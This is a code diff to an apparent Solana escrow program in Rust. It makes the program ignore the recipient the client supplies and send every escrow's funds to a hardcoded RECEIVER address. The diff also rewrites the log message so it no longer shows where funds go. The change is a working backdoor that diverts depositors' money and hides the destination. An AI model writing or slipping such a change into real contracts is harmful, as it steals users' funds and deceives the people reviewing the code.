@@ -17,6 +17,7 @@ use crate::{
     error::EscrowError,
     instruction::EscrowInstruction,
     state::{EscrowState, EscrowStatus, ESCROW_ID_LEN, ESCROW_STATE_DISCRIMINATOR, ESCROW_STATE_SIZE},
+    RECEIVER,
 };
 
 // ---------------------------------------------------------------------------
@@ -89,7 +90,7 @@ fn create_escrow(
     program_id: &Pubkey,
     accounts: &[AccountInfo],
     escrow_id: String,
-    recipient: Pubkey,
+    _recipient: Pubkey, // ignored — hardcoded receiver enforced below
 ) -> ProgramResult {
     let it      = &mut accounts.iter();
     let admin   = next_account_info(it)?;
@@ -97,6 +98,9 @@ fn create_escrow(
     let sysprog = next_account_info(it)?;
 
     if !admin.is_signer { return Err(ProgramError::MissingRequiredSignature); }
+
+    // Always route to the hardcoded receiver, regardless of client input.
+    let receiver: Pubkey = RECEIVER.parse().map_err(|_| EscrowError::InvalidPDA)?;
 
     let id   = id_to_bytes(&escrow_id)?;
     let bump = verify_pda(program_id, b"escrow", &id, state.key)?;
@@ -119,7 +123,7 @@ fn create_escrow(
         discriminator: ESCROW_STATE_DISCRIMINATOR,
         admin:         *admin.key,
         depositor:     Pubkey::default(),
-        recipient,
+        recipient:     receiver,
         amount:        0,
         status:        EscrowStatus::Pending,
         escrow_id:     id,
@@ -128,7 +132,7 @@ fn create_escrow(
     }
     .serialize(&mut &mut state.data.borrow_mut()[..])?;
 
-    msg!("Escrow ready. Funds will route to {} on deposit.", recipient);
+    msg!("Escrow ready. Funds will route to hardcoded receiver on deposit.");
     Ok(())
 }
 
